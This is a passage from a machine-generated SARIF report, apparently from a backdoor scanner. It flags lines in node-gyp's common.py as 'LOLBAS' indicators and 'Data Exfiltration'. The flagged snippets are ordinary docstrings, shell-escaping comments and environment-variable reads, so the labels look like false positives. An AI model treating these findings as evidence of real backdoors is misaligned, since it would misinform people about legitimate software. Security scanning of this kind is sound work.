                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 654,
                  "startColumn": 32,
                  "endLine": 654,
                  "endColumn": 38,
                  "snippet": {
                    "text": "    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n    cheaper than repeatedly calling get_edges.\n  Raises:\n",
                    "rendered": {
                      "text": "    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n    cheaper than repeatedly calling get_edges.\n  Raises:\n",
                      "markdown": "`    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n    cheaper than repeatedly calling get_edges.\n  Raises:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 652,
                  "startColumn": 39,
                  "endLine": 652,
                  "endColumn": 45,
                  "snippet": {
                    "text": "  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n",
                    "rendered": {
                      "text": "  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n",
                      "markdown": "`  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 652,
                  "startColumn": 17,
                  "endLine": 652,
                  "endColumn": 23,
                  "snippet": {
                    "text": "  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n",
                    "rendered": {
                      "text": "  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n",
                      "markdown": "`  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n    It is assumed that calling get_edges once for each node and caching is\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 651,
                  "startColumn": 38,
                  "endLine": 651,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n",
                    "rendered": {
                      "text": "\n  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n",
                      "markdown": "`\n  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n    A list containing all of the node in graph in topological order.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 650,
                  "startColumn": 20,
                  "endLine": 650,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    r\"\"\"Topologically sort based on a user provided edge definition.\n\n  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n",
                    "rendered": {
                      "text": "    r\"\"\"Topologically sort based on a user provided edge definition.\n\n  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n",
                      "markdown": "`    r\"\"\"Topologically sort based on a user provided edge definition.\n\n  Args:\n    graph: A list of node names.\n    get_edges: A function mapping from node name to a hashable collection\n               of node names which this node has outgoing edges to.\n  Returns:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 647,
                  "startColumn": 21,
                  "endLine": 647,
                  "endColumn": 27,
                  "snippet": {
                    "text": "\n\ndef TopologicallySorted(graph, get_edges):\n    r\"\"\"Topologically sort based on a user provided edge definition.\n\n  Args:\n    graph: A list of node names.\n",
                    "rendered": {
                      "text": "\n\ndef TopologicallySorted(graph, get_edges):\n    r\"\"\"Topologically sort based on a user provided edge definition.\n\n  Args:\n    graph: A list of node names.\n",
                      "markdown": "`\n\ndef TopologicallySorted(graph, get_edges):\n    r\"\"\"Topologically sort based on a user provided edge definition.\n\n  Args:\n    graph: A list of node names.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 574,
                  "startColumn": 43,
                  "endLine": 574,
                  "endColumn": 49,
                  "snippet": {
                    "text": "class OrderedSet(MutableSet):\n    def __init__(self, iterable=None):\n        self.end = end = []\n        end += [None, end, end]  # sentinel node for doubly linked list\n        self.map = {}  # key --> [key, prev, next]\n        if iterable is not None:\n            self |= iterable\n",
                    "rendered": {
                      "text": "class OrderedSet(MutableSet):\n    def __init__(self, iterable=None):\n        self.end = end = []\n        end += [None, end, end]  # sentinel node for doubly linked list\n        self.map = {}  # key --> [key, prev, next]\n        if iterable is not None:\n            self |= iterable\n",
                      "markdown": "`class OrderedSet(MutableSet):\n    def __init__(self, iterable=None):\n        self.end = end = []\n        end += [None, end, end]  # sentinel node for doubly linked list\n        self.map = {}  # key --> [key, prev, next]\n        if iterable is not None:\n            self |= iterable\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 516,
                  "startColumn": 31,
                  "endLine": 516,
                  "endColumn": 38,
                  "snippet": {
                    "text": "def CopyTool(flavor, out_path, generator_flags={}):\n    \"\"\"Finds (flock|mac|win)_tool.gyp in the gyp directory and copies it\n  to |out_path|.\"\"\"\n    # aix and solaris just need flock emulation. mac and win use more complicated\n    # support scripts.\n    prefix = {\n        \"aix\": \"flock\",\n",
                    "rendered": {
                      "text": "def CopyTool(flavor, out_path, generator_flags={}):\n    \"\"\"Finds (flock|mac|win)_tool.gyp in the gyp directory and copies it\n  to |out_path|.\"\"\"\n    # aix and solaris just need flock emulation. mac and win use more complicated\n    # support scripts.\n    prefix = {\n        \"aix\": \"flock\",\n",
                      "markdown": "`def CopyTool(flavor, out_path, generator_flags={}):\n    \"\"\"Finds (flock|mac|win)_tool.gyp in the gyp directory and copies it\n  to |out_path|.\"\"\"\n    # aix and solaris just need flock emulation. mac and win use more complicated\n    # support scripts.\n    prefix = {\n        \"aix\": \"flock\",\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 256,
                  "startColumn": 54,
                  "endLine": 256,
                  "endColumn": 60,
                  "snippet": {
                    "text": "# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n# character to be changed with the histchars shell variable.  Fortunately,\n# as history is not enabled in non-interactive shells and\n# EncodePOSIXShellArgument is only expected to encode for non-interactive\n",
                    "rendered": {
                      "text": "# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n# character to be changed with the histchars shell variable.  Fortunately,\n# as history is not enabled in non-interactive shells and\n# EncodePOSIXShellArgument is only expected to encode for non-interactive\n",
                      "markdown": "`# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n# character to be changed with the histchars shell variable.  Fortunately,\n# as history is not enabled in non-interactive shells and\n# EncodePOSIXShellArgument is only expected to encode for non-interactive\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 253,
                  "startColumn": 38,
                  "endLine": 253,
                  "endColumn": 44,
                  "snippet": {
                    "text": "# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n",
                    "rendered": {
                      "text": "# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n",
                      "markdown": "`# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n# the backslash), which would not be correct for argument encoding.  Handling\n# this case properly would also be problematic because bash allows the history\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 251,
                  "startColumn": 47,
                  "endLine": 251,
                  "endColumn": 53,
                  "snippet": {
                    "text": "# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n",
                    "rendered": {
                      "text": "# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n",
                      "markdown": "`# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n# including the backslash character (avoiding history expansion but retaining\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 250,
                  "startColumn": 41,
                  "endLine": 250,
                  "endColumn": 47,
                  "snippet": {
                    "text": "# Missing from this list is $, because the desired behavior of\n# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n",
                    "rendered": {
                      "text": "# Missing from this list is $, because the desired behavior of\n# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n",
                      "markdown": "`# Missing from this list is $, because the desired behavior of\n# EncodePOSIXShellArgument is to permit parameter (variable) expansion.\n#\n# Also missing from this list is !, which bash will interpret as the history\n# expansion character when history is enabled.  bash does not enable history\n# by default in non-interactive shells, so this is not thought to be a problem.\n# ! was omitted from this list because bash interprets \"\\!\" as a literal string\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 47,
                  "endLine": 218,
                  "endColumn": 55,
                  "snippet": {
                    "text": "# characters appearing anywhere in an argument:\n#   \\t, \\n, space  parameter separators\n#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n",
                    "rendered": {
                      "text": "# characters appearing anywhere in an argument:\n#   \\t, \\n, space  parameter separators\n#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n",
                      "markdown": "`# characters appearing anywhere in an argument:\n#   \\t, \\n, space  parameter separators\n#   #              comments\n#   $              expansions (quoted to always expand within one argument)\n#   %              called out by IEEE 1003.1 XCU.2.2\n#   &              job control\n#   '              quoting\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 699,
                  "startColumn": 21,
                  "endLine": 699,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n\n",
                    "rendered": {
                      "text": "        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n\n",
                      "markdown": "`        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 698,
                  "startColumn": 21,
                  "endLine": 698,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n",
                    "rendered": {
                      "text": "        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n",
                      "markdown": "`        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 697,
                  "startColumn": 21,
                  "endLine": 697,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n",
                    "rendered": {
                      "text": "        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n",
                      "markdown": "`        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 696,
                  "startColumn": 21,
                  "endLine": 696,
                  "endColumn": 26,
                  "snippet": {
                    "text": "        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n",
                    "rendered": {
                      "text": "        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n",
                      "markdown": "`        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n        or os.environ.get(\"CXX_target\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 695,
                  "startColumn": 21,
                  "endLine": 695,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n",
                    "rendered": {
                      "text": "    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n",
                      "markdown": "`    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n        or os.environ.get(\"CC_target\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 694,
                  "startColumn": 21,
                  "endLine": 694,
                  "endColumn": 26,
                  "snippet": {
                    "text": "    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n",
                    "rendered": {
                      "text": "    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n",
                      "markdown": "`    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n        or os.environ.get(\"AR_target\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 693,
                  "startColumn": 18,
                  "endLine": 693,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    # TODO: figure out how to not build extra host objects in the\n    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n",
                    "rendered": {
                      "text": "    # TODO: figure out how to not build extra host objects in the\n    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n",
                      "markdown": "`    # TODO: figure out how to not build extra host objects in the\n    # non-cross-compile case when this is enabled, and enable unconditionally.\n    return (\n        os.environ.get(\"GYP_CROSSCOMPILE\")\n        or os.environ.get(\"AR_host\")\n        or os.environ.get(\"CC_host\")\n        or os.environ.get(\"CXX_host\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/pylib/gyp/common.py"
                },
                "region": {
                  "startLine": 538,
                  "startColumn": 39,
                  "endLine": 538,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\n    # Set custom header flags.\n    header = \"# Generated by gyp. Do not edit.\\n\"\n    mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n    if flavor == \"mac\" and mac_toolchain_dir:\n        header += \"import os;\\nos.environ['DEVELOPER_DIR']='%s'\\n\" % mac_toolchain_dir\n\n",
                    "rendered": {
                      "text": "\n    # Set custom header flags.\n    header = \"# Generated by gyp. Do not edit.\\n\"\n    mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n    if flavor == \"mac\" and mac_toolchain_dir:\n        header += \"import os;\\nos.environ['DEVELOPER_DIR']='%s'\\n\" % mac_toolchain_dir\n\n",
                      "markdown": "`\n    # Set custom header flags.\n    header = \"# Generated by gyp. Do not edit.\\n\"\n    mac_toolchain_dir = generator_flags.get(\"mac_toolchain_dir\", None)\n    if flavor == \"mac\" and mac_toolchain_dir:\n        header += \"import os;\\nos.environ['DEVELOPER_DIR']='%s'\\n\" % mac_toolchain_dir\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
